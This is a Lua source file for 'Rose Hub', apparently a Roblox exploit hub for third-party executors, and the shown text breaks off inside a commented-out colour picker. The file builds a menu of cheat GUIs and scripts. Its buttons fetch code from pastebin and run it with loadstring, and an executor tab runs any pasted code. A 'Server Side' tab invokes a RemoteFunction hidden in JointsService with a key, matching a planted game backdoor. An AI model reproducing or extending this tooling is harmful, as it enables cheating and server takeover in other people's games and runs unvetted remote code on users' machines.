local textColor = Color3.fromRGB(255, 255, 255)
local httpService = game:GetService("HttpService")
local savingSettings = false
local mainSettings = nil
local lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")
local chat = game:GetService("Chat")

--Delete old GUI
function FindTable(Table, Name)
	for i,v in pairs(Table) do
		if v == Name then
			return true
		end end
	return false
 end
  
 for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
	if v:IsA("ScreenGui") then
	if FindTable(delete, v.Name) then
		v:Destroy()
	end
 end
 end

--Create Frames
local screenGui = game:GetObjects("rbxassetid://3410845588")[1]
screenGui.Parent = game:GetService("CoreGui")
screenGui.Enabled = false
screenGui.Main.Top:FindFirstChildOfClass("TextLabel").Text = "Rose Hub "..VERSION

local colourpicker = game:GetObjects("rbxassetid://3444232310")[1]
colourpicker.Parent = game:GetService("CoreGui")
colourpicker.Enabled = false    

local intro = game:GetObjects("rbxassetid://3394996507")[1]
intro.Parent = game:GetService("CoreGui")

local function round(num)
    return math.floor(num * 10^3 + 0.5) / 10^3
end

local function createFrame(Active, BackgroundColor3, BackgroundTransparency, BorderSizePixel, ClipsDescendants, Name, Parent, Position, Size)
    local Frame = Instance.new("Frame")
    Frame.Active = Active
    Frame.BackgroundColor3 = BackgroundColor3
    Frame.BackgroundTransparency = BackgroundTransparency
    Frame.BorderSizePixel = BorderSizePixel
    Frame.ClipsDescendants = ClipsDescendants
    Frame.Name = Name
    Frame.Parent = Parent
    Frame.Position = Position
    Frame.Size = Size
    return Frame
end

local function createTextLabel(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment, ZIndex)
    local TextLabel = Instance.new("TextLabel")
    TextLabel.BackgroundColor3 = BackgroundColor3
    TextLabel.BackgroundTransparency = BackgroundTransparency
    TextLabel.BorderSizePixel = BorderSizePixel
    TextLabel.Font = Font
    TextLabel.Name = Name
    TextLabel.Parent = Parent
    TextLabel.Position = Position
    TextLabel.Size = Size
    TextLabel.Text = Text
    TextLabel.TextColor3 = TextColor3
    TextLabel.TextSize = TextSize
    TextLabel.TextWrapped = TextWrapped
    TextLabel.TextXAlignment = TextXAlignment
    TextLabel.TextYAlignment = TextYAlignment
    TextLabel.ZIndex = ZIndex
    return TextLabel
end

local function createTextBox(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, PlaceholderText, Position, Size, Text, TextColor3, TextSize, TextWrapped, TextXAlignment, TextYAlignment)
    local TextBox = Instance.new("TextBox")
    TextBox.BackgroundColor3 = BackgroundColor3
    TextBox.BackgroundTransparency = BackgroundTransparency
    TextBox.BorderSizePixel = BorderSizePixel
    TextBox.Font = Font
    TextBox.Name = Name
    TextBox.Parent = Parent
    TextBox.PlaceholderText = PlaceholderText
    TextBox.Position = Position
    TextBox.Size = Size
    TextBox.Text = Text
    TextBox.TextColor3 = TextColor3
    TextBox.TextSize = TextSize
    TextBox.TextWrapped = TextWrapped
    TextBox.TextXAlignment = TextXAlignment
    TextBox.TextYAlignment = TextYAlignment
    return TextBox
end

local function createTextButton(BackgroundColor3, BackgroundTransparency, BorderSizePixel, Font, Name, Parent, Position, Size, Text, TextColor3, TextSize, ZIndex, func)
    local TextButton = Instance.new("TextButton")
    TextButton.BackgroundColor3 = BackgroundColor3
    TextButton.BackgroundTransparency = BackgroundTransparency
    TextButton.BorderSizePixel = BorderSizePixel
    TextButton.Font = Font
    TextButton.Name = Name
    TextButton.Parent = Parent
    TextButton.Position = Position
    TextButton.Size = Size
    TextButton.Text = Text
    TextButton.TextColor3 = TextColor3
    TextButton.TextSize = TextSize
    TextButton.ZIndex = ZIndex
    TextButton.MouseButton1Up:Connect(func)
    return TextButton
end

local function createImageLabel(BackgroundTransparency, Image, Name, Parent, Position, Selectable, Size, ZIndex)
    local ImageLabel = Instance.new("ImageLabel")
    ImageLabel.BackgroundTransparency = BackgroundTransparency
    ImageLabel.Image = Image
    ImageLabel.Name = Name
    ImageLabel.Parent = Parent
    ImageLabel.Position = Position
    ImageLabel.Selectable = Selectable
    ImageLabel.Size = Size
    ImageLabel.ZIndex = ZIndex
    return ImageLabel
end

local function createScrollingFrame(BackgroundColor3, BackgroundTransparency, BorderSizePixel, BottomImage, CanvasSize, MidImage, Name, Parent, Position, Rotation, ScrollBarThickness, Selectable, Size, TopImage, Visible)
    local ScrollingFrame = Instance.new("ScrollingFrame")
    ScrollingFrame.BackgroundColor3 = BackgroundColor3
    ScrollingFrame.BackgroundTransparency = BackgroundTransparency
    ScrollingFrame.BorderSizePixel = BorderSizePixel
    ScrollingFrame.BottomImage = BottomImage
    ScrollingFrame.CanvasSize = CanvasSize
    ScrollingFrame.MidImage = MidImage
    ScrollingFrame.Name = Name
    ScrollingFrame.Parent = Parent
    ScrollingFrame.Position = Position
    ScrollingFrame.Rotation = Rotation
    ScrollingFrame.ScrollBarThickness = ScrollBarThickness
    ScrollingFrame.Selectable = Selectable
    ScrollingFrame.Size = Size
    ScrollingFrame.TopImage = TopImage
    ScrollingFrame.Visible = Visible
    return ScrollingFrame
end

local defaultSettings = {
	["BackgroundColorR"] = 59,
	["BackgroundColorG"] = 59,
	["BackgroundColorB"] = 59,
	["PickerColorR"] = 59,
	["PickerColorG"] = 59,
	["PickerColorB"] = 59,
	["ChangePickerBackground"] = true,
	["Transparency"] = 0.7,
	["RainbowOn"] = false,
	["RainbowSpeed"] = 75,
 }

 local function round(num)
	return math.floor(num *10^3 + 0.5) / 10^3
 end

 if writefile and readfile and pcall(function() readfile("RoseHubSettings.txt") end) then
	local file = readfile("RoseHubSettings.txt")
	local letsgo = true
	local write = false
	if pcall(function() httpService:JSONDecode(file) end) then
		file = httpService:JSONDecode(readfile("RoseHubSettings.txt"))
		mainSettings = file
	else
		mainSettings = defaultSettings
		writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
		warn("Settings file corrupted, creating new.")
		letsgo = false
	end
	if letsgo then
		for setting,value in pairs(defaultSettings) do
			if file[setting] == nil then
				writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
				warn(setting.." is missing, setting to default.")
				file[setting] = defaultSettings[setting]
				write = true
			elseif file[setting] ~= nil then
				if type(file[setting]) ~= type(defaultSettings[setting]) then
					warn(setting.." is invalid, overwriting.")
					write = true
					file[setting] = defaultSettings[setting]
				end
			end
		end
		if write == true then
			warn("Fixing settings file.")
			mainSettings = file
			writefile("RoseHubSettings.txt", httpService:JSONEncode(mainSettings))
			write = false
		end
	end
 else
	mainSettings = defaultSettings
	if writefile then
		warn("Rose Hub settings missing, creating new.")
		writefile("RoseHubSettings.txt", httpService:JSONEncode(defaultSettings))
	end
 end
  
 local savedColor = Color3.fromRGB(mainSettings.BackgroundColorR, mainSettings.BackgroundColorG, mainSettings.BackgroundColorB)
 local mainTransparency = mainSettings.Transparency
 local enableRainbow = mainSettings.RainbowOn
 local rainbowCount = mainSettings.RainbowSpeed
 local mainTrans = mainSettings.Transparency
 local changeColorPickerBack = mainSettings.ChangePickerBackground
 local colorPickerBack = Color3.fromRGB(mainSettings.PickerColorR, mainSettings.PickerColorG, mainSettings.PickerColorB)
  
 local function saveSetting(backColor, pickerColor, changeBack, tranparency, rainbowOn, rainbowSpeed)
	local settingsTab = {
		["BackgroundColorR"] = round(backColor.r*255),
		["BackgroundColorG"] = round(backColor.g*255),
		["BackgroundColorB"] = round(backColor.b*255),
		["PickerColorR"] = round(pickerColor.r*255),
		["PickerColorG"] = round(pickerColor.g*255),
		["PickerColorB"] = round(pickerColor.b*255),
		["ChangePickerBackground"] = changeBack,
		["Transparency"] = round(tranparency),
		["RainbowOn"] = rainbowOn,
		["RainbowSpeed"] = rainbowSpeed,
	}
	writefile("RoseHubSettings.txt", httpService:JSONEncode(settingsTab))
 end
  
 if darkBack then
	backColor = Color3.fromRGB(150, 150, 150)
 end

local scripttabList = {
    {"VSimFucker", "dtHywXGM", 1},

}

local modulestabList = {
    {"Work In progress", 0, 2}
	--{"Modules GUI", 03107712466, 2},
}

local guistabList = {
	{"Ro-Xploit 4.0", 175137115, 2},
	{"Ro-Xploit 5.0", 288646117, 2},
	{"Ro-Xploit 6.0", 364364477, 2},
	{"Dex 2.0", 492005721, 2},
	{"Dex 3.0", 418957341, 2},
	{"YourMom GUI", 289110135, 2},
	{"Pepe GUI", 277881926, 2},
	{"Vesprin FE GUI", 1231351616, 2},
 }

 local mapstabList = {
	{"Town Map", 1345094164, 2},
	{"Night Club", 1281063730, 2},
 }

 local lists = {
	{scripttabList, "Scripts"},
	{modulestabList, "Modules"},
	{guistabList, "GUIs"},
    {mapstabList, "Maps"},
 }

 local tabs = {
    "Home",
    "Scripts",
    "Modules",
    "Purchased Scripts",
    "GUIs",
    "Executor",
    "Server Side",
    "Maps",
    "Audios",
    "Economy",
    "Settings",
    "Credits",
}
 
function CreateInstance(cls,props)
    local inst = Instance.new(cls)
    for i,v in pairs(props) do
        inst[i] = v
    end
    return inst
end

--Copy Discord Invite
screenGui.Main.Top.Important.HomeTab.Discord.MouseButton1Up:Connect(function()
local copy = true
if pcall(function() Synapse:Copy("http://discord.io/rosehub") end) then
	
else
	local copy2 = setclipboard or Clipboard.set
	copy2("http://discord.io/rosehub")

end

screenGui.Main.Top.Important.HomeTab.Discord.Text = "Copied!"
wait(2)
screenGui.Main.Top.Important.HomeTab.Discord.Text = "Discord Server:\nhttps://discord.io/rosehub"
end)

--[[All Script Tabs,
Sort lists and insert them--]]
for _,list in pairs(lists) do
    local toSort = {}
    local sortedList = {}
    local pos = 0
    
    for _,v in pairs(list[1]) do
        table.insert(toSort, v[1])
    end
    
    table.sort(toSort)
    
    for i,name in pairs(toSort) do
        for i,actualTable in pairs(list[1]) do
            if name == actualTable[1] then
                table.insert(sortedList, {actualTable[1], actualTable[2], actualTable[3]})
            end
        end
    end
    
    --Function to create the buttons
    local function createButons(text)
        pos = 5
        for _,button in pairs(sortedList) do
            if text == "" or string.match(string.lower(button[1]), string.lower(text)) then
                createTextButton(backColor, mainTrans, 0, Enum.Font.SourceSans, button[1], screenGui.Main.Top.Important[list[2].."Tab"].Holder, UDim2.new(0, 5, 0, pos), UDim2.new(0, 181, 0, 20), button[1], textColor, 14, 1, function()
                    if button[3] == 1 then
                        loadstring(game:HttpGet("https://pastebin.com/raw/"..button[2], true))()
                    elseif button[3] == 2 then
                        loadstring(game:GetObjects("rbxassetid://"..button[2])[1].Source)()
                    end
                end)
                pos = pos + 23
            end
        end
    end
    
    --Remove Buttons and create new on search
    local function removeButtons()
        for _,button in pairs(screenGui.Main.Top.Important[list[2].."Tab"].Holder:GetChildren()) do
            button:Destroy()
        end
    end
    
    --Search Function
    screenGui.Main.Top.Important[list[2].."Tab"].Search.PlaceholderColor3 = textColor
    screenGui.Main.Top.Important[list[2].."Tab"].Search.PlaceholderText = "Search "..list[2]
    local function searchBar(chosenList)	
        local search = screenGui.Main.Top.Important[chosenList.."Tab"].Search
        local currentSearch = ""
        search.Changed:connect(function(property)
            if property == "Text" then
                if search.Text ~= "" and search.Text ~= currentSearch then
                    currentSearch = search.Text
                    removeButtons()
                    createButons(search.Text)
                elseif search.Text == "" and currentSearch.Text ~= "" then
                    currentSearch = search.Text
                    removeButtons()
                    createButons("")
                end
            end
        end)
    end	
    
    searchBar(list[2])
    
    --Create Buttons with no search
    createButons("")
    
    screenGui.Main.Top.Important[list[2].."Tab"].Holder.CanvasSize = UDim2.new(1, 0, 0, pos + 2)
end

--Tab Changer
local underline = screenGui.Main.Top.SelectedTab
local tabs = screenGui.Main.Top.Tabs:GetChildren()
local LastTab = tabs[1]
local tweening = false
local OrigSize = underline.Size
local tabPos = 0
local tweenPos = tabPos + 20
local oldTab = screenGui.Main.Top.Tabs.Home

for _,tab in next, tabs do
	if tab:IsA("TextButton") then
		local tweenPos = tabPos + 22
		tab.MouseButton1Up:Connect(function()
			if tweening == false and tab ~= oldTab then
				tweening = true
				underline:TweenSizeAndPosition(UDim2.new(0, 2, 0, 0), UDim2.new(0.5, 0, underline.Position.Y.Scale, underline.Position.Y.Offset), "Out", "Quad", tweenSpeed)
				local newUnderline = createFrame(false, backColor, 0, 0, false, "Frame", screenGui.Main.Top.Tabs, UDim2.new(0.5, 0, 1, -3), UDim2.new(0, 0, 0, 2))
				newUnderline:TweenSize(UDim2.new(0, tab.TextBounds.X, 0, 2), --[[UDim2.new(0, 55 - tab.TextBounds.X/2, 0, tweenPos),]] "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.Important[tostring(oldTab).."Tab"]:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.Important[tostring(tab).."Tab"]:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", tweenSpeed)
				screenGui.Main.Top.CurrentTab:TweenSize(UDim2.new(0, 0, 0, 31), "Out", "Quad", tweenSpeed/2)
                newUnderline.LayoutOrder = tab.LayoutOrder
                newUnderline.AnchorPoint = Vector2.new(0.5, 1)
                newUnderline.Parent = tab
                wait(tweenSpeed/2)
				screenGui.Main.Top.CurrentTab.Label.Text = tab.Name
				screenGui.Main.Top.CurrentTab:TweenSize(UDim2.new(0, 109, 0, 31), "Out", "Quad", tweenSpeed/2)
                wait(tweenSpeed/2)
				screenGui.Main.Top.Important[tostring(oldTab).."Tab"].Position = UDim2.new(-1, 0, 0, 0)
				underline:Destroy()
				underline = newUnderline
				oldTab = tab
				tweening = false
			end
		end)
		tabPos = tabPos + 26
	end
end

--Server Side
screenGui.Serverside.Active = true
screenGui.Serverside.Draggable = true

--Execute
screenGui.Main.Top.Important.ServerSideTab.ExecuteButton.MouseButton1Up:Connect(function()
    local e = game:GetService("JointsService")
    local rem = e.RemoteFunction
    assert(rem, "Remote is missing.")
    rem:InvokeServer(true, screenGui.Main.Top.Important.ServerSideTab.KeyInput.Text, screenGui.Main.Top.Important.ServerSideTab.ScriptHolder.ScriptInput.Text, {})
end)

--Clear Serverside Input
screenGui.Main.Top.Important.ServerSideTab.ClearButton.MouseButton1Up:Connect(function()
	screenGui.Main.Top.Important.ServerSideTab.ScriptHolder.ScriptInput.Text = ""
end)

-- Temp Toggle Script Editor
screenGui.Main.Top.Important.ServerSideTab.settings.MouseButton1Up:Connect(function()
	screenGui.Serverside.Visible = true
end)

--Execute In Script Editor
screenGui.Serverside.execute.MouseButton1Up:Connect(function()
    local e = game:GetService("JointsService")
    local rem = e.RemoteFunction
    assert(rem, "Remote is missing.")
    rem:InvokeServer(true, screenGui.Main.Top.Important.ServerSideTab.KeyInput.Text, screenGui.Serverside.scriptinput.Text, {})
end)

--Clear In Script Editor
screenGui.Serverside.clear.MouseButton1Up:Connect(function()
	screenGui.Serverside.scriptinput.Text = ""
end)

--Close Script Editor
screenGui.Serverside.close.MouseButton1Up:Connect(function()
    screenGui.Serverside.Visible = false
end)


--Executor
--Execute Button
screenGui.Main.Top.Important.ExecutorTab.execute.MouseButton1Up:Connect(function()
    loadstring(screenGui.Main.Top.Important.ExecutorTab.Holder.input.Text)
end)

--Clear Button
screenGui.Main.Top.Important.ExecutorTab.clear.MouseButton1Up:Connect(function()
    screenGui.Main.Top.Important.ExecutorTab.Holder.input.Text = ""
end)

--Audios Tab
local volume = 1
local audioPage = 1

local function stopSounds()
    for _,obj in pairs(lighting:GetChildren()) do
        if obj:IsA("Sound") then
            obj:Destroy()
        end
    end
    
    for i,v in pairs(chat:GetChildren()) do
        if v:IsA("Sound") then
            v:Destroy()
        end
    end

    for _,obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Sound") then
            obj:Destroy()
        end
    end
end

local function playSong(id)
    stopSounds()
    local sound = Instance.new("Sound")
    sound.Parent = lighting
    sound.SoundId = "rbxassetid://"..tostring(id)
    sound.Volume = volume
    sound.Name = "RoseHubSound"
    sound.Looped = true
    sound.Playing = true
end

local audioHolder = screenGui.Main.Top.Important.AudiosTab.Holder
local audioInputBox = screenGui.Main.Top.Important.AudiosTab.audioinput
audioInputBox.PlaceholderColor3 = textColor

screenGui.Main.Top.Important.AudiosTab.Stop.MouseButton1Up:Connect(function()
    stopSounds()
end)

local volumeBox = screenGui.Main.Top.Important.AudiosTab.VolumeBox

screenGui.Main.Top.Important.AudiosTab.Set.MouseButton1Up:Connect(function()
    if tonumber(volumeBox.Text) then
        volume =  tonumber(volumeBox.Text)
        pcall(function()
            lighting.RoseHubSound.Volume = volume
        end)
    end
end)

local currentSong = screenGui.Main.Top.Important.AudiosTab.CurrentSong

screenGui.Main.Top.Important.AudiosTab.PreviousPage.MouseButton1Up:Connect(function()
    if audioPage > 1 then
        audioPage = audioPage - 1
    createAudios(audioPage)
    end
end)

screenGui.Main.Top.Important.AudiosTab.NextPage.MouseButton1Up:Connect(function()
    audioPage = audioPage + 1
    createAudios(audioPage)
end)

function createAudios(audioPage)
    local audioKeyword = audioInputBox.Text
    --local json = "https://search.roblox.com/catalog/json?Category=Audio&Keyword="..audioKeyword.."&ResultsPerPage=25&PageNumber="..tostring(audioPage)
    local json = "https://search.roblox.com/catalog/contents?CatalogContext=&Keyword="..audioKeyword.."&SortAggregation=5&LegendExpanded=true&Category=9&ResultsPerPage=25&PageNumber="..tostring(audioPage)
    local gotJson = game:HttpGet(json, true)
    local rawResult = httpService:JSONDecode(gotJson)
    local pos = 5
    for _,button in pairs(audioHolder:GetChildren()) do
        button:Destroy()
    end
    for _,tab in pairs(rawResult) do
        local scale = false
        local button = createTextButton(backColor, mainTrans, 0, Enum.Font.SourceSans, tab.Name, screenGui.Top.Important.AudiosTab.Holder, UDim2.new(0, 5, 0, pos), UDim2.new(0, 181, 0, 20), tab.Name, textColor, 14, 1, function()
            playSong(tab.AssetId)
            currentSong.Text = tab.Name
            currentSong.TextScaled = scale
        end)
        if button.TextBounds.X > button.Size.X.Offset then
            button.TextScaled = true
            scale = true
        end
        pos = pos + 23
    end
    audioHolder.CanvasSize = UDim2.new(0, 0, 0, pos + 2)
end

screenGui.Main.Top.Important.AudiosTab.search.MouseButton1Up:Connect(function()
    createAudios(1)
end)

--Remove pcall
pcall(function()
    createAudios(1)
end)

--[[local ColorPicker = {}

ColorPicker.new = function()
    pickerCreated = true
    local newMt = setmetatable({},{})
    
    local rootGui = colourpicker
    rootGui.Parent = coreGui
    rootGui.Enabled = true
    pickerGui = rootGui.ColorPicker
    local pickerTopBar = pickerGui.TopBar
    backDrop = pickerGui.Backdrop
    local pickerFrame = pickerGui.Backdrop.Content
    local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
    local colorStrip = pickerFrame.ColorStrip
    local previewFrame = pickerFrame.Preview
    local basicColorsFrame = pickerFrame.BasicColors
    local customColorsFrame = pickerFrame.CustomColors
    local okButton = pickerFrame.Ok
    local cancelButton = pickerFrame.Cancel
    local closeButton = pickerTopBar.Close
    local colorScope = colorSpace.Scope
    local colorArrow = pickerFrame.ArrowFrame.Arrow
    local hueInput = pickerFrame.Hue.Input
    local satInput = pickerFrame.Sat.Input
    local valInput = pickerFrame.Val.Input
    local redInput = pickerFrame.Red.Input
    local greenInput = pickerFrame.Green.Input
    local blueInput = pickerFrame.Blue.Input
    local user = game:GetService("UserInputService")
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
    
    local hue,sat,val = Color3.toHSV(savedColor)
    local red,green,blue = savedColor.r, savedColor.g, savedColor.b
    local chosenColor = savedColor
    local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
    local customColors = {}
    local function updateColor(noupdate)
        local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
        local hsvColor = Color3.fromHSV(hue,sat,val)

        if noupdate == 2 or not noupdate then
            hueInput.Text = tostring(math.ceil(359*hue))
            satInput.Text = tostring(math.ceil(255*sat))
            valInput.Text = tostring(math.floor(255*val))
        end
        if noupdate == 1 or not noupdate then
            redInput.Text = tostring(math.floor(255*red))
            greenInput.Text = tostring(math.floor(255*green))
            blueInput.Text = tostring(math.floor(255*blue))
        end

        chosenColor = Color3.new(red,green,blue)

        colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
        colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
        colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
        previewFrame.BackgroundColor3 = chosenColor

        updateBack(chosenColor, backDrop)
        
        newMt.Color = chosenColor
        if newMt.Changed then 
            newMt:Changed(chosenColor)
        end
    end
    local function colorSpaceInput()
        local relativeX = mouse.X - colorSpace.AbsolutePosition.X
        local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
            
        if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
        if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
            
        hue = (219 - relativeX)/219
        sat = (199 - relativeY)/199

        local hsvColor = Color3.fromHSV(hue,sat,val)
        red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

        updateColor()
    end
    local function colorStripInput()
        local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y

        if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

        val = (199 - relativeY)/199

        local hsvColor = Color3.fromHSV(hue,sat,val)
        red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

        updateColor()
    end
    local function hookButtons(frame,func)
        frame.ArrowFrame.Up.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Up.BackgroundTransparency = 0.5
            elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
                local releaseEvent,runEvent
        
                local startTime = tick()
                local pressing = true
                local startNum = tonumber(frame.Text)
        
                if not startNum then return end
        
                releaseEvent = user.InputEnded:Connect(function(input)
                    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                    releaseEvent:Disconnect()
                    pressing = false
                end)
        
                startNum = startNum + 1
                func(startNum)
                while pressing do
                    if tick()-startTime > 0.3 then
                        startNum = startNum + 1
                        func(startNum)
                    end
                    wait(0.1)
                end
            end
        end)

        frame.ArrowFrame.Up.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Up.BackgroundTransparency = 1
            end
        end)

        frame.ArrowFrame.Down.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Down.BackgroundTransparency = 0.5
            elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
                local releaseEvent,runEvent
        
                local startTime = tick()
                local pressing = true
                local startNum = tonumber(frame.Text)
        
                if not startNum then return end
        
                releaseEvent = user.InputEnded:Connect(function(input)
                    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                    releaseEvent:Disconnect()
                    pressing = false
                end)
        
                startNum = startNum - 1
                func(startNum)
                while pressing do
                    if tick()-startTime > 0.3 then
                        startNum = startNum - 1
                        func(startNum)
                    end
                    wait(0.1)
                end
            end
        end)

        frame.ArrowFrame.Down.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Down.BackgroundTransparency = 1
            end
        end)
    end
    colorSpace.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
    
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
    
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    colorSpaceInput()
                end
            end)
    
            colorSpaceInput()
        end
    end)
    colorStrip.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
    
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
    
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    colorStripInput()
                end
            end)
    
            colorStripInput()
        end
    end)
    local function updateHue(str)
        local num = tonumber(str)
        if num then
            hue = math.clamp(math.floor(num),0,359)/359
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            hueInput.Text = tostring(hue*359)
            updateColor(1)
        end
    end
    hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
    local function updateSat(str)
        local num = tonumber(str)
        if num then
            sat = math.clamp(math.floor(num),0,255)/255
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            satInput.Text = tostring(sat*255)
            updateColor(1)
        end
    end
    satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
    local function updateVal(str)
        local num = tonumber(str)
        if num then
            val = math.clamp(math.floor(num),0,255)/255
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            valInput.Text = tostring(val*255)
            updateColor(1)
        end
    end
    valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
    
    local function updateRed(str)
        local num = tonumber(str)
        if num then
            red = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            redInput.Text = tostring(red*255)
            updateColor(2)
        end
    end
    redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
    
    local function updateGreen(str)
        local num = tonumber(str)
        if num then
            green = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            greenInput.Text = tostring(green*255)
            updateColor(2)
        end
    end
    greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
    
    local function updateBlue(str)
        local num = tonumber(str)
        if num then
            blue = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            blueInput.Text = tostring(blue*255)
            updateColor(2)
        end
    end
    blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
    
    local colorChoice = Instance.new("TextButton")
    colorChoice.Name = "Choice"
    colorChoice.Size = UDim2.new(0,25,0,18)
    colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
    colorChoice.Text = ""
    colorChoice.AutoButtonColor = false
    
    local row = 0
    local column = 0
    for i,v in pairs(basicColors) do
        local newColor = colorChoice:Clone()
        newColor.BackgroundColor3 = v
        newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
        
        newColor.MouseButton1Click:Connect(function()
            red,green,blue = v.r,v.g,v.b
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            updateColor()
        end)	
        
        newColor.Parent = basicColorsFrame
        column = column + 1
        if column == 6 then row = row + 1 column = 0 end
    end
    
    row = 0
    column = 0
    for i = 1,12 do
        local color = customColors[i] or Color3.new(0,0,0)
        local newColor = colorChoice:Clone()
        newColor.BackgroundColor3 = color
        newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
        
        newColor.MouseButton1Click:Connect(function()
            local curColor = customColors[i] or Color3.new(0,0,0)
            red,green,blue = curColor.r,curColor.g,curColor.b
            hue,sat,val = Color3.toHSV(curColor)
            updateColor()
        end)
        
        newColor.MouseButton2Click:Connect(function()
            customColors[i] = chosenColor
            newColor.BackgroundColor3 = chosenColor
        end)
        
        newColor.Parent = customColorsFrame
        column = column + 1
        if column == 6 then row = row + 1 column = 0 end
    end
    
    pickerTopBar.InputBegan:Connect(function(input)
